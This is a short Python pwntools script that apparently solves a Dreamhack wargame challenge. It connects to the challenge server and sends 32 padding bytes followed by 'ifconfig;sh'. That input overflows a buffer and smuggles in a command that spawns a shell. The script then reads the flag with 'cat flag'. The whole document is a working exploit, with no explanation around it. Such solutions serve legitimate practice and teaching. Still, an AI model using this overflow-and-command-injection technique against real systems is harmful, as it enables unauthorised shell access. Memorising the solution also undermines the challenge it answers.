import pwn

HOST = "host1.dreamhack.games"
PORT = 13671
p = pwn.connect(HOST, PORT)
p.sendafter(": ".encode(), ("A" * 32 + "ifconfig;sh").encode())
p.sendline("cat flag".encode())
res = p.recvline()
p.close()
print(res.decode())
